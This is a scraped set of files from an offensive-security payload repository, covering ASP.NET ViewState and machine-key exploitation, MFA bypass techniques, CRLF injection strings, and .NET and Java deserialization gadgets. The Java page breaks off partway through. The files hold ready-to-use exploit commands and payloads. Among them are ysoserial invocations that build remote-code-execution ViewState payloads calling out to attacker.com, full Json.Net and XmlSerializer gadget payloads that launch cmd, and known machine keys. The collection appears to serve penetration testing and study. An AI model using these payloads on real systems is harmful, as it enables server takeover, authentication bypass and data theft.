{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "API Key Leaks/IIS-Machine-Keys.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/API%20Key%20Leaks/IIS-Machine-Keys.md", "content": "# IIS Machine Keys\n\n> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.\n\n## Summary\n\n* [Viewstate Format](#viewstate-format)\n* [Machine Key Format And Locations](#machine-key-format-and-locations)\n* [Identify Known Machine Key](#identify-known-machine-key)\n* [Decode ViewState](#decode-viewstate)\n* [Generate ViewState For RCE](#generate-viewstate-for-rce)\n    * [MAC Is Not Enabled](#mac-is-not-enabled)\n    * [MAC Is Enabled And Encryption Is Disabled](#mac-is-enabled-and-encryption-is-disabled)\n    * [MAC Is Enabled And Encryption Is Enabled](#mac-is-enabled-and-encryption-is-enabled)\n* [Edit Cookies With The Machine Key](#edit-cookies-with-the-machine-key)\n* [References](#references)\n\n## Viewstate Format\n\nViewState in IIS is a technique used to retain the state of web controls between postbacks in ASP.NET applications. It stores data in a hidden field on the page, allowing the page to maintain user input and other state information.\n\n| Format | Properties |\n| --- | --- |\n| Base64 | `EnableViewStateMac=False`,  `ViewStateEncryptionMode=False` |\n| Base64 + MAC | `EnableViewStateMac=True` |\n| Base64 + Encrypted | `ViewStateEncryptionMode=True` |\n\nBy default until Sept 2014, the `enableViewStateMac` property was to set to `False`.\nUsually unencrypted viewstate are starting with the string `/wEP`.\n\n## Machine Key Format And Locations\n\nA machineKey in IIS is a configuration element in ASP.NET that specifies cryptographic keys and algorithms used for encrypting and validating data, such as view state and forms authentication tokens. It ensures consistency and security across web applications, especially in web farm environments.\n\nThe format of a machineKey is the following.\n\n```xml\n<machineKey validationKey=\"[String]\"  decryptionKey=\"[String]\" validation=\"[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]\"  decryption=\"[Auto (default) | DES | 3DES | AES | alg:algorithm_name]\" />\n```\n\nThe `validationKey` attribute specifies a hexadecimal string used to validate data, ensuring it hasn't been tampered with.\n\nThe `decryptionKey` attribute provides a hexadecimal string used to encrypt and decrypt sensitive data.\n\nThe `validation` attribute defines the algorithm used for data validation, with options like SHA1, MD5, 3DES, AES, and HMACSHA256, among others.\n\nThe `decryption` attribute specifies the encryption algorithm, with options like Auto, DES, 3DES, and AES, or you can specify a custom algorithm using alg:algorithm_name.\n\nThe following example of a machineKey is from [Microsoft documentation](https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication).\n\n```xml\n<machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\" decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" />\n```\n\nCommon locations of **web.config** / **machine.config**\n\n* 32-bits\n    * `C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config`\n    * `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config`\n* 64-bits\n    * `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config`\n    * `C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config`\n* in the registry when **AutoGenerate** is enabled (extract with [irsdl/machineKeyFinder.aspx](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab))\n    * `HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4`  \n    * `HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey`\n\n## Identify Known Machine Key\n\nTry multiple machine keys from known products, Microsoft documentation, or other part of the Internet.\n\n* [isclayton/viewstalker](https://github.com/isclayton/viewstalker)\n\n    ```powershell\n    ./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt\n    ____   ____.__                       __         .__   __\n    \\   \\ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ \n    \\   Y   / |  |/ __ \\ \\/ \\/ /  ___/\\   __\\__  \\ |  | |  |/ // __ \\_  __ \\\n    \\     /  |  \\  ___/\\     /\\___ \\  |  |  / __ \\|  |_|    <\\  ___/|  | \\/\n    \\___/   |__|\\___  >\\/\\_//____  > |__| (____  /____/__|_ \\\\___  >__|   \n                    \\/           \\/            \\/          \\/    \\/       \n\n    KEY FOUND!!!\n    Host:   \n    Validation Key: XXXXX,XXXXX\n    ```\n\n* [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)\n\n    ```ps1\n    python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6\n    Matching MachineKeys found!\n    validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1\n    ```\n\n* [NotSoSecure/Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)\n\n    ```powershell\n    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy\n    ```\n\n* [0xacb/viewgen](https://github.com/0xacb/viewgen)\n\n    ```powershell\n    $ viewgen --guess \"/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\"\n    [+] ViewState is not encrypted\n    [+] Signature algorithm: SHA1\n    ```\n\nList of interesting machine keys to use:\n\n* [NotSoSecure/Blacklist3r/MachineKeys.txt](https://github.com/NotSoSecure/Blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt)\n* [isclayton/viewstalker/MachineKeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/MachineKeys2.txt)\n* [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)\n\n## Decode ViewState\n\n* [BApp Store > ViewState Editor](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc) - ViewState Editor is an extension that allows you to view and edit the structure and contents of V1.1 and V2.0 ASP view state data.\n* [0xacb/viewgen](https://github.com/0xacb/viewgen)\n\n    ```powershell\n    viewgen --decode --check --webconfig web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\"\n    ```\n\n## Generate ViewState For RCE\n\nFirst you need to decode the Viewstate to know if the MAC and the encryption are enabled.\n\n**Requirements**:\n\n* `__VIEWSTATE`\n* `__VIEWSTATEGENERATOR`\n\n### MAC Is Not Enabled\n\n```ps1\nysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c \"powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName\"\n```\n\n### MAC Is Enabled And Encryption Is Disabled\n\n* Find the machine key (validationkey) using `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` or `viewgen`\n\n    ```ps1\n    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy\n    # --modifier = `__VIEWSTATEGENERATOR` parameter value\n    # --encrypteddata = `__VIEWSTATE` parameter value of the target application\n    ```\n\n* Then generate a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `TextFormattingRunProperties` and `TypeConfuseDelegate` gadgets can be used.\n\n    ```ps1\n    .\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName\" --generator=CA0B0334 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\n    .\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"powershell.exe -c nslookup http://attacker.com\" --generator=3E92B2D6 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\n\n    # --generator = `__VIEWSTATEGENERATOR` parameter value\n    # --validationkey = validation key from the previous command\n    ```\n\n### MAC Is Enabled And Encryption Is Enabled\n\nDefault validation algorithm is `HMACSHA256` and the default decryption algorithm is `AES`.\n\nIf the `__VIEWSTATEGENERATOR` is missing but the application uses .NET Framework version 4.0 or below, you can use the root of the app (e.g: `--apppath=\"/testaspx/\"`).\n\n* **.NET Framework < 4.5**, ASP.NET always accepts an unencrypted `__VIEWSTATE` if you remove the `__VIEWSTATEENCRYPTED` parameter from the request\n\n    ```ps1\n    .\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"echo 123 > c:\\windows\\temp\\test.txt\" --apppath=\"/testaspx/\" --islegacy --validationalg=\"SHA1\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\" --isdebug\n    ```\n\n* **.NET Framework > 4.5**, the machineKey has the property: `compatibilityMode=\"Framework45\"`\n\n    ```ps1\n    .\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"echo 123 > c:\\windows\\temp\\test.txt\" --path=\"/somepath/testaspx/test.aspx\" --apppath=\"/testaspx/\" --decryptionalg=\"AES\" --decryptionkey=\"34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887\" --validationalg=\"HMACSHA256\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\"\n    ```\n\n## Edit Cookies With The Machine Key\n\nIf you have the `machineKey` but the viewstate is disabled.\n\nASP.net Forms Authentication Cookies : [liquidsec/aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools)\n\n```powershell\n# decrypt cookie\n$ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes\n\n# encrypt cookie (edit Decrypted.txt)\n$ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt\n```\n\n## References\n\n* [Deep Dive into .NET ViewState Deserialization and Its Exploitation - Swapneil Kumar Dash - October 22, 2019](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\n* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili - April 23, 2019](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)\n* [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net - Claranet - June 13, 2019](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)\n* [Project Blacklist3r - @notsosecure - November 23, 2018](https://www.notsosecure.com/project-blacklist3r/)\n* [View State, The Unpatchable IIS Forever Day Being Actively Exploited - Zeroed - July 21, 2024](https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)\n", "timestamp": "2025-10-21T13:29:49.562790"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Account Takeover/mfa-bypass.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md", "content": "# MFA Bypasses\n\n> Multi-Factor Authentication (MFA) is a security measure that requires users to provide two or more verification factors to gain access to a system, application, or network. It combines something the user knows (like a password), something they have (like a phone or security token), and/or something they are (biometric verification). This layered approach enhances security by making unauthorized access more difficult, even if a password is compromised.\n> MFA Bypasses are techniques attackers use to circumvent MFA protections. These methods can include exploiting weaknesses in MFA implementations, intercepting authentication tokens, leveraging social engineering to manipulate users or support staff, or exploiting session-based vulnerabilities.\n\n## Summary\n\n* [Response Manipulation](#response-manipulation)\n* [Status Code Manipulation](#status-code-manipulation)\n* [2FA Code Leakage in Response](#2fa-code-leakage-in-response)\n* [JS File Analysis](#js-file-analysis)\n* [2FA Code Reusability](#2fa-code-reusability)\n* [Lack of Brute-Force Protection](#lack-of-brute-force-protection)\n* [Missing 2FA Code Integrity Validation](#missing-2fa-code-integrity-validation)\n* [CSRF on 2FA Disabling](#csrf-on-2fa-disabling)\n* [Password Reset Disable 2FA](#password-reset-disable-2fa)\n* [Backup Code Abuse](#backup-code-abuse)\n* [Clickjacking on 2FA Disabling Page](#clickjacking-on-2fa-disabling-page)\n* [Enabling 2FA doesn't expire Previously active Sessions](#enabling-2fa-doesnt-expire-previously-active-sessions)\n* [Bypass 2FA by Force Browsing](#bypass-2fa-by-force-browsing)\n* [Bypass 2FA with null or 000000](#bypass-2fa-with-null-or-000000)\n* [Bypass 2FA with array](#bypass-2fa-with-array)\n\n## 2FA Bypasses\n\n### Response Manipulation\n\nIn response if `\"success\":false`\nChange it to `\"success\":true`\n\n### Status Code Manipulation\n\nIf Status Code is **4xx**\nTry to change it to **200 OK** and see if it bypass restrictions\n\n### 2FA Code Leakage in Response\n\nCheck the response of the 2FA Code Triggering Request to see if the code is leaked.\n\n### JS File Analysis\n\nRare but some JS Files may contain info about the 2FA Code, worth giving a shot\n\n### 2FA Code Reusability\n\nSame code can be reused\n\n### Lack of Brute-Force Protection\n\nPossible to brute-force any length 2FA Code\n\n### Missing 2FA Code Integrity Validation\n\nCode for any user acc can be used to bypass the 2FA\n\n### CSRF on 2FA Disabling\n\nNo CSRF Protection on disabling 2FA, also there is no auth confirmation\n\n### Password Reset Disable 2FA\n\n2FA gets disabled on password change/email change\n\n### Backup Code Abuse\n\nBypassing 2FA by abusing the Backup code feature\nUse the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions\n\n### Clickjacking on 2FA Disabling Page\n\nIframing the 2FA Disabling page and social engineering victim to disable the 2FA\n\n### Enabling 2FA doesn't expire Previously active Sessions\n\nIf the session is already hijacked and there is a session timeout vuln\n\n### Bypass 2FA by Force Browsing\n\nIf the application redirects to `/my-account` url upon login while 2Fa is disabled, try replacing `/2fa/verify` with `/my-account` while 2FA is enabled to bypass verification.\n\n### Bypass 2FA with null or 000000\n\nEnter the code **000000** or **null** to bypass 2FA protection.\n\n### Bypass 2FA with array\n\n```json\n{\n    \"otp\":[\n        \"1234\",\n        \"1111\",\n        \"1337\", // GOOD OTP\n        \"2222\",\n        \"3333\",\n        \"4444\",\n        \"5555\"\n    ]\n}\n```\n", "timestamp": "2025-10-21T13:29:50.186568"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "CRLF Injection/Files/crlfinjection.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/Files/crlfinjection.txt", "content": "/%%0a0aSet-Cookie:crlf=injection\n/%0aSet-Cookie:crlf=injection\n/%0d%0aSet-Cookie:crlf=injection\n/%0dSet-Cookie:crlf=injection\n/%23%0aSet-Cookie:crlf=injection\n/%23%0d%0aSet-Cookie:crlf=injection\n/%23%0dSet-Cookie:crlf=injection\n/%25%30%61Set-Cookie:crlf=injection\n/%25%30aSet-Cookie:crlf=injection\n/%250aSet-Cookie:crlf=injection\n/%25250aSet-Cookie:crlf=injection\n/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection\n/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection\n/%2F..%0d%0aSet-Cookie:crlf=injection\n/%3f%0d%0aSet-Cookie:crlf=injection\n/%3f%0dSet-Cookie:crlf=injection\n/%u000aSet-Cookie:crlf=injection\n", "timestamp": "2025-10-21T13:29:52.582689"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "DISCLAIMER.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DISCLAIMER.md", "content": "# DISCLAIMER\n\nThe authors and contributors of this repository disclaim any and all responsibility for the misuse of the information, tools, or techniques described herein. The content is provided solely for educational and research purposes. Users are strictly advised to utilize this information in accordance with applicable laws and regulations and only on systems for which they have explicit authorization.\n\nBy accessing and using this repository, you agree to:\n\n* Refrain from using the provided information for any unethical or illegal activities.\n* Ensure that all testing and experimentation are conducted responsibly and with proper authorization.\n* Acknowledge that any actions you take based on the contents of this repository are solely your responsibility.\n\nNeither the authors nor contributors shall be held liable for any damages, direct or indirect, resulting from the misuse or unauthorized application of the knowledge contained herein. Always act mindfully, ethically, and within the boundaries of the law.\n", "timestamp": "2025-10-21T13:29:55.549316"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Insecure Deserialization/DotNET.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md", "content": "# .NET Deserialization\n\n> .NET serialization is the process of converting an object’s state into a format that can be easily stored or transmitted, such as XML, JSON, or binary. This serialized data can then be saved to a file, sent over a network, or stored in a database. Later, it can be deserialized to reconstruct the original object with its data intact. Serialization is widely used in .NET for tasks like caching, data transfer between applications, and session state management.\n\n## Summary\n\n* [Detection](#detection)\n* [Tools](#tools)\n* [Formatters](#formatters)\n    * [XmlSerializer](#xmlserializer)\n    * [DataContractSerializer](#datacontractserializer)\n    * [NetDataContractSerializer](#netdatacontractserializer)\n    * [LosFormatter](#losformatter)\n    * [JSON.NET](#jsonnet)\n    * [BinaryFormatter](#binaryformatter)\n* [POP Gadgets](#pop-gadgets)\n* [References](#references)\n\n## Detection\n\n| Data           | Description         |\n| -------------- | ------------------- |\n| `AAEAAD` (Hex) | .NET BinaryFormatter |\n| `FF01` (Hex)   | .NET ViewState |\n| `/w` (Base64)   | .NET ViewState |\n\nExample: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`\n\n## Tools\n\n* [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) - Deserialization payload generator for a variety of .NET formatters\n\n    ```ps1\n    cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s\n    ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini\n    ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t\n    ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t\n    ```\n\n* [irsdl/ysonet](https://github.com/irsdl/ysonet) - Deserialization payload generator for a variety of .NET formatters\n\n    ```ps1\n    cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s\n    ./ysonet.exe -p DotNetNuke -m read_file -f win.ini\n    ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t\n    ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t\n    ```\n\n## Formatters\n\n![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)\n.NET Native Formatters from [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)\n\n### XmlSerializer\n\n* In C# source code, look for `XmlSerializer(typeof(<TYPE>));`.\n* The attacker must control the **type** of the XmlSerializer.\n* Payload output: **XML**\n\n```xml\n.\\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c \"calc.exe\"\n<?xml version=\"1.0\"?>\n<root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\n    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >\n        <ExpandedElement/>\n        <ProjectedProperty0>\n            <MethodName>Parse</MethodName>\n            <MethodParameters>\n                <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">\n                    <![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>\n                </anyType>\n            </MethodParameters>\n            <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>\n        </ProjectedProperty0>\n    </ExpandedWrapperOfXamlReaderObjectDataProvider>\n</root>\n```\n\n### DataContractSerializer\n\n> The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.\n\n* In C# source code, look for `DataContractSerializer(typeof(<TYPE>))`.\n* Payload output: **XML**\n* Data **Type** must be user-controlled to be exploitable\n\n### NetDataContractSerializer\n\n> It extends the `System.Runtime.Serialization.XmlObjectSerializer` class and is capable of serializing any type annotated with serializable attribute as `BinaryFormatter`.\n\n* In C# source code, look for `NetDataContractSerializer().ReadObject()`.\n* Payload output: **XML**\n\n```ps1\n.\\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t\n```\n\n### LosFormatter\n\n* Use `BinaryFormatter` internally.\n\n```ps1\n.\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t\n```\n\n### JSON.NET\n\n* In C# source code, look for `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`.\n* Payload output: **JSON**\n\n```ps1\n.\\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc.exe\" -t\n{\n    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', \n    'MethodName':'Start',\n    'MethodParameters':{\n        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n        '$values':['cmd', '/c calc.exe']\n    },\n    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\n}\n```\n\n### BinaryFormatter\n\n> The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter is insecure and can’t be made secure.\n\n* In C# source code, look for `System.Runtime.Serialization.Binary.BinaryFormatter`.\n* Exploitation requires `[Serializable]` or `ISerializable` interface.\n* Payload output: **Binary**\n\n```ps1\n./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t\n```\n\n## POP Gadgets\n\nThese gadgets must have the following properties:\n\n* Serializable\n* Public/settable variables\n* Magic \"functions\": Get/Set, OnSerialisation, Constructors/Destructors\n\nYou must carefully select your **gadgets** for a targeted **formatter**.\n\nList of popular gadgets used in common payloads.\n\n* **ObjectDataProvider** from `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\WPF\\PresentationFramework.dll`\n    * Use `MethodParameters` to set arbitrary parameters\n    * Use `MethodName` to call an arbitrary function\n* **ExpandedWrapper**\n    * Specify the `object types` of the objects that are encapsulated\n\n    ```cs\n    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();\n    ```\n\n* **System.Configuration.Install.AssemblyInstaller**\n    * Execute payload with Assembly.Load\n\n    ```cs\n    // System.Configuration.Install.AssemblyInstaller\n    public void set_Path(string value){\n        if (value == null){\n            this.assembly = null;\n        }\n        this.assembly = Assembly.LoadFrom(value);\n    }\n    ```\n\n## References\n\n* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - Slides - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)\n* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - White Paper - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)\n* [Attacking .NET Deserialization - Alvaro Muñoz - April 28, 2018](https://youtu.be/eDfGpu3iE4Q)\n* [Attacking .NET Serialization - Alvaro - October 20, 2017](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)\n* [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - HackTricks - July 18, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)\n* [Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)\n* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - April 23, 2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)\n* [Finding a New DataContractSerializer RCE Gadget Chain - dugisec - November 7, 2019](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)\n* [Friday the 13th: JSON Attacks - DEF CON 25 Conference - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)\n* [Friday the 13th: JSON Attacks - Slides - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)\n* [Friday the 13th: JSON Attacks - White Paper - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)\n* [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - Alyssa Rahman - December 13, 2021](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)\n* [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Shubham Shah - November 2, 2021](https://blog.assetnote.io/2021/11/02/sitecore-rce/)\n", "timestamp": "2025-10-21T13:30:02.550841"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Insecure Deserialization/Java.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md", "content": "# Java Deserialization\n\n> Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs.\n\n## Summary\n\n* [Detection](#detection)\n* [Tools](#tools)\n    * [Ysoserial](#ysoserial)\n    * [Burp extensions using ysoserial](#burp-extensions)\n    * [Alternative Tooling](#alternative-tooling)\n* [YAML Deserialization](#yaml-deserialization)\n* [ViewState](#viewstate)\n* [References](#references)\n\n## Detection\n\n* `\"AC ED 00 05\"` in Hex\n    * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.\n    * `00 05`: STREAM_VERSION. The serialization version.\n* `\"rO0\"` in Base64\n* `Content-Type` = \"application/x-java-serialized-object\"\n* `\"H4sIAAAAAAAAAJ\"` in gzip(base64)\n\n## Tools\n\n### Ysoserial\n\n[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.\n\n```java\njava -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin\njava -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin\njava -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin\njava -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64\n```\n\n**List of payloads included in ysoserial:**\n\n| Payload             | Authors                                | Dependencies |\n| ------------------- | -------------------------------------- | --- |\n| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |\n| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |\n| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11 